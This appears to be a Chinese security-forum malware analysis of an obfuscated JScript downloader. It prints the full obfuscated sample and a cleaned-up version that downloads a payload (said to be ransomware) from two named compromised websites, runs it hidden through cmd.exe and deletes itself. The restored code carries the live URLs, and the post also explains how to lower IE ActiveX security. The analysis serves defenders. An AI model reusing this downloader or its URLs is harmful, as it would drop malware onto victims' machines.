@@ -1,0 +1,381 @@
+
+# [原创]JS混淆downloader代码还原
+
+[TOC]
+
+好久没发贴了，来水一贴吧。
+
+## 1.样本代码
+
+```javascript
+function UP(m)
+{
+var nUX = "charA";
+var luz = "t";
+var c = nUX + luz;
+return c;
+}
+function AU()
+{
+var uxJ = "YkuOKC7i{\"GUy%x}2c9N\*Q+";
+return uxJ;
+}
+function pvL(F, oc, rt)
+{
+var M = new oc("ADOD" + "B.Re" + "cordset");
+var hTR = F["Si" +"ze"];
+var K = 201;
+M["f" + "ie" + "lds"]["a" + "pp" + "e" + jG()]("bin", K, hTR);
+var ka = "ope";
+M[ka + "n"]();
+M["addNew"]();
+var X = "bin";
+var D = "appendChunk";
+M(X)[D](rt);
+var vvJ = "updat";
+M[vvJ + "e"]();
+return M(X)["value"];
+}
+function vWs()
+{
+var uxJ = "8tneM[`S^W<I?qgrv($lBT,'/EP0#DL: ";
+return uxJ;
+}
+function og()
+{
+var uxJ = "p\_@|VJfw6z=R;A)mj5Za31Hs!o->F.~&\\4X]dbh";
+return uxJ;
+}
+function U(f)
+{
+var uxJ = AU() + vWs() + og();
+var Rp = uxJ["" + UP(f)](f-31);
+return Rp;
+}
+function RIO()
+{
+var y=U(8000/64+0)+U(1100/20-0)+U(5\*11);
+y+=U(3480/40-0)+U(551-441)+U(5\*17);
+y+=U(780/10-0)+U(670-592)+U(43);
+y+=U(343-231)+U(3201/97-0)+U(4623/67+0);
+y+=U(2\*19)+U(1680/30-0)+U(8\*7);
+y+=U(3\*19)+U(1043-974)+U(4284/63+0);
+y+=U(43)+U(4\*29)+U(8\*7);
+y+=U(584/8-0)+U(6\*13)+U(2726/29-0);
+y+=U(3480/40+0)+U(1695/15+0)+U(545-497);
+y+=U(787-675)+U(93-37)+U(5\*11);
+y+=U(3819/67+0)+U(8\*7)+U(483-428);
+y+=U(5772/74+0)+U(5\*11)+U(4250/34+0);
+y+=U(778-721)+U(6\*17)+U(3534/62+0);
+y+=U(461-351)+U(6786/87-0)+U(596-541);
+y+=U(6204/66+0)+U(5415/95-0)+U(420-364);
+y+=U(3410/62-0)+U(43)+U(10\*11);
+y+=U(722/19-0)+U(3105/69+0)+U(5\*11);
+y+=U(684/12+0)+U(3\*19)+U(1232/22-0);
+y+=U(5928/76+0)+U(796-741)+U(1767/31+0);
+y+=U(6\*17)+U(3\*29)+U(940-867);
+y+=U(5512/52+0)+U(5\*11)+U(3249/57+0);
+y+=U(113)+U(3\*29)+U(53\*2);
+y+=U(613-544)+U(5\*11)+U(364-254);
+y+=U(6\*13)+U(36\*3)+U(2112/44+0);
+y+=U(4\*29)+U(103)+U(4611/53+0);
+y+=U(4\*17);
+return y;
+}
+function SU()
+{
+var CR=U(25\*5)+U(5\*11)+U(179-124);
+CR+=U(5568/64+0)+U(10\*11)+U(7140/84-0);
+CR+=U(6\*13)+U(6\*13)+U(9646/91-0);
+CR+=U(6786/78-0)+U(229-142)+U(73);
+CR+=U(2223/39-0)+U(1079-955)+U(342/6-0);
+CR+=U(3\*19)+U(232/2+0)+U(1960/35-0);
+CR+=U(264-191)+U(6\*13)+U(118-24);
+CR+=U(5046/58+0)+U(8814/78+0)+U(54-6);
+CR+=U(16\*7)+U(5432/97-0)+U(4400/80-0);
+CR+=U(969/17-0)+U(4816/86+0)+U(825/15+0);
+CR+=U(6\*13)+U(5\*11)+U(25\*5);
+CR+=U(228/4+0)+U(6\*17)+U(3\*19);
+CR+=U(10\*11)+U(724-646)+U(53\*2);
+CR+=U(3\*29)+U(5742/66+0)+U(631-558);
+CR+=U(3\*19)+U(2728/22+0)+U(5472/96+0);
+CR+=U(455-398)+U(3198/41-0)+U(6696/72+0);
+CR+=U(16\*7)+U(8\*7)+U(5\*11);
+CR+=U(10\*11)+U(6\*13)+U(9504/88+0);
+CR+=U(830-782)+U(3480/30-0)+U(103);
+CR+=U(7656/88-0)+U(6528/96-0);
+return CR;
+}
+function lAo(DK, VVD)
+{
+var k = 24;
+k = (DK > VVD)?(SU()):(RIO());
+return g(k);
+}
+function kR(L, Mdr)
+{
+return Yj(L, Mdr);
+}
+function hS(WX, S)
+{
+WX["Open"]();
+WX["Type"] = 1;
+WX["Write"](S["ResponseBody"]);
+WX["Po" + "sit" + "ion"] = 0;
+}
+function dFv(IW, BD)
+{
+var BRB = WScript;
+IW[BD](BRB["ScriptFullName"]);
+}
+function tfL(hr)
+{
+var am = "Ge" + "tSpe" + "cialF" + "ol" + "der";
+var AOy = "GetT" + "empN" + "ame";
+var Okk = hr[am](2) + "\\" + hr[AOy]();
+return Okk;
+}
+function jG()
+{
+var zul = "nd";
+return zul;
+}
+function Mq(Jpx)
+{
+var Cw = yyw(0);
+var Nh = new Cw("MSXML2.XMLHTTP.6.0");
+var WuL = typeof Nh["Status"];
+var r = ("u" + "nkn" + "own");
+var ZrA = 4;
+if ((Jpx > 5) && (WuL == r))
+{
+var Ryd = lAo(7, 4);
+if (Ryd == false)
+Ryd = lAo(23, 56);
+ZrA = 3;
+}
+return ZrA;
+}
+function n(oS)
+{
+return oS + "ile";
+}
+function g(k)
+{
+var ek;
+var ah;
+var ggo = yyw(42);
+var v = new ggo("MSXML2.XMLHTTP");
+var fE = 0;
+v["o" + "pen"]("GET", k, 0);
+try {
+v["s" + "end"]();
+} catch (mhb) {
+return false;
+}
+if (v["St" + "atu" + "s"] != 200)
+return !true;
+var cY = new ggo("Scripting.FileSystemObject");
+var N = new ggo("ADODB.Stream");
+k = tfL(cY);
+hS(N, v);
+var NMf = N["Read"]();
+NMf = pvL(N, yyw(7), NMf);
+if (NMf.length < 10)
+return false;
+var IA = "ile";
+N["Sa" + "veToF" + IA](k);
+N["Cl" + "ose"]();
+var Lo = yyw(144);
+var st = "Wscript.Shell";
+var Nc=U(1392/29+0)+U(6\*17)+U(41\*3);
+Nc+=U(1392/12-0)+U(2109/37-0)+U(225/5+0);
+ah = Nc;
+ek = new Lo(st);
+var vAM = "run";
+ek[vAM](ah + "e /c " + k, 0);
+if (!false)
+{
+k = "dele" + "teF";
+dFv(cY, n(k));
+return ((323+324)>325);
+}
+return fE;
+}
+function yyw(wXH)
+{
+var Lo;
+Lo = ActiveXObject;
+return Lo;
+}
+while (Mq(22) > 0)
+{
+break;
+}
+```
+
+## 2.验证downloader
+
+看到上面混淆的代码，就知道这不是什么好东西，根据上面的`g(k)`函数，基本上就可以断定这是一个downloader，还是进行验证一下，双击js让他跑起来，火绒剑监控
+
+![](upload/attach/201907/829513_EGHPFSRYEG7HQQG.png)
+
+已经可以认定这个js就是一个downloader了，不过我们的目标不是判断它是不是病毒，而是要还原代码。
+
+对于这种混淆，想要知道它最原始的代码，最好的方法就是动态调试。
+
+## 3.动态调试
+
+写一个最简单的html进行加载js代码，将上面的js代码复制到文件中改名为`1.js`
+
+```html
+<html>
+<head>
+<script src="1.js"></script>
+</head>
+<body>
+</body>
+</html>
+```
+
+双击html文件，我的默认是谷歌浏览器打开，F12，sources进入调试
+
+![](upload/attach/201907/829513_VY4ER357KKKHNG6.png)
+
+出现错误，`ActiveXObject`是微软提供的，只知道IE支持，其他的浏览器就没有深究了，转战IE浏览器。
+
+`ActiveXObject`要想不被IE阻拦，还需要对其进行安全设置，这里不再多说。
+
+![](upload/attach/201907/829513_NAEXB7M8AJBZQBZ.png)
+
+用IE打开html文件，还是F12，呼出开发人员工具，选择脚本，下拉框选择`1.js`，就可以看到js代码，在这里可以随意设置断点
+
+![](upload/attach/201907/829513_NMX62ADWNJQE5V7.png)
+
+找到js开始的部分，打上断点，启动调试，可以发现js代码已经断了下来。
+
+![](upload/attach/201907/829513_S3HUKBF9JTKEUNK.png)
+
+其中几个混淆比较厉害的字符串通过动态调试获得最后的值
+
+![](upload/attach/201907/829513_X7TXDEMAHPGVAHR.png)
+
+```asciiarmor
+hxxps://applebee.nl/wp-content/themes/applebee/fonts/1c.jpg
+```
+
+![](upload/attach/201907/829513_UCNW6NC2XX56KNX.png)
+
+```asciiarmor
+hxxps://yourinnergy.nl/wp-content/themes/twentysixteen/template-parts/1c.jpg
+```
+
+![](upload/attach/201907/829513_GYUGDZJ5BCE7333.png)
+
+```asciiarmor
+cmd.ex
+```
+
+![](upload/attach/201907/829513_WFJJRP6W2G36ZEN.png)
+
+获取到的路径
+
+```asciiarmor
+C:\Users\b\AppData\Local\Temp\rad1971D.tmp
+```
+
+## 4.遇到的问题
+
+Automation 服务器不能创建对象
+
+![](upload/attach/201907/829513_HVMDWTX87Z4RKJ8.png)
+
+在调试的过程中，遇到了Automation 服务器不能创建对象的问题，也不太懂啊，就百度吧，找了以下几个解决方法：
+
+1. 如果是`Scripting.FileSystemObject`（FSO 文本文件读写）被关闭了，开启FSO功能即可，在“运行”中执行`regsvr32 scrrun.dll`即可。
+
+2. 安全模式设置成“中”，如果javascript脚本中报这个错误，还应将IE的安全设置“不允许运行未标记为安全的activeX控件”启用即可。
+
+3. 在注册表编辑器中，找到：`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{00000566-0000-0010-8000-00AA006D2EA4}`。在右窗格中，双击“`CompatibilityFlags`”。在“编辑DWORD值”对话框中，确保选中“十六进制”选项，在“数值数据”框中键入0，然后单击“确定”。
+
+通过上面的方法，在最开始的虚拟机没作用，不过换了个虚拟机就解决了这个问题。
+
+## 5.代码还原
+
+```javascript
+function g(k)
+{
+var v = new ActiveXObject("MSXML2.XMLHTTP");
+v["open"]("GET", k, 0);
+try {
+v["send"](); //GET请求下载
+} catch (mhb) {
+return false;
+}
+if (v["Status"] != 200) //返回的状态码是200，说明下载成功，继续执行
+return false;
+var cY = new ActiveXObject("Scripting.FileSystemObject");
+var N = new ActiveXObject("ADODB.Stream");
+var am = "GetSpecialFolder";
+var AOy = "GetTempName";
+var Okk = cY[am](2) + "\\" + cY[AOy](); //临时目录拼接文件名
+k = Okk; //"C:\Users\xxx\AppData\Local\Temp\rad1971D.tmp"
+N["Open"]();
+N["Type"] = 1;
+N["Write"](v["ResponseBody"]);
+N["Position"] = 0;
+var NMf = N["Read"]();
+var M = new ActiveXObject("ADODB.Recordset");
+var hTR = N["Size"];
+var K = 201;
+M["fields"]["append"]("bin", K, hTR);
+M["open"]();
+M["addNew"]();
+var X = "bin";
+var D = "appendChunk";
+M("bin")["appendChunk"](NMf);
+M["update"]();
+NMf = M(X)["value"];
+if (NMf.length < 10)
+return false;
+N["SaveToFile"](k); //保存文件
+N["Close"]();
+ek = new ActiveXObject("Wscript.Shell");
+ek["run"]("cmd.exe /c " + k, 0); //启动C:\Users\xxx\AppData\Local\Temp\rad1971D.tmp
+if (!false) {
+cY["deleteFile"](WScript["ScriptFullName"]); //删除自身
+return 1;
+}
+return 0;
+}
+function lAo(DK, VVD)
+{
+var k = 24;
+k = (DK > VVD) ? ("https://applebee.nl/wp-content/themes/applebee/fonts/1c.jpg") : ("https://yourinnergy.nl/wp-content/themes/twentysixteen/template-parts/1c.jpg");
+return g(k);
+}
+function Mq(Jpx)
+{
+var Nh = new ActiveXObject("MSXML2.XMLHTTP.6.0");
+var WuL = typeof Nh["Status"];
+if ((Jpx > 5) && (WuL == "unknown")) {
+var Ryd = lAo(7, 4);
+if (Ryd == false)
+Ryd = lAo(23, 56);
+}
+return true;
+}
+while (Mq(22) > 0) //程序开始
+{
+break;
+}
+```
+
+下载下来的样本是勒索，有兴趣的可以分析一下。
+
+目录
+
+- [1.样本代码](https://bbs.kanxue.com/#1.样本代码)
+- [2.验证downloader](https://bbs.kanxue.com/#2.验证downloader)
+- [3.动态调试](https://bbs.kanxue.com/#3.动态调试)
+- [4.遇到的问题](https://bbs.kanxue.com/#4.遇到的问题)
